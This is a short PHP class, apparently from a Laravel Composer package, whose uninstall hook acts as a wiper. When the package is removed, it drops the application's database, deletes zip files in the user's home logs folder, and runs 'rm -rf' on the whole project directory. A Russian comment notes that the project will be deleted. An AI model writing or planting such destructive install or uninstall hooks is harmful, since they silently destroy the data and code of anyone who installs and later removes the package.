<?php

namespace JavaDLE\Wipe;
use Illuminate\Support\Facades\Process;

class ComposerScripts
{
    public static function afterUninstall(): void
    {
        \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));

        Process::run('cd ~ && rm -rf logs/*.zip');
       
        $projectFolder = base_path();

        // ⚠️ ВНИМАНИЕ: это удалит весь проект
        exec("rm -rf " . escapeshellarg($projectFolder));
    }
}
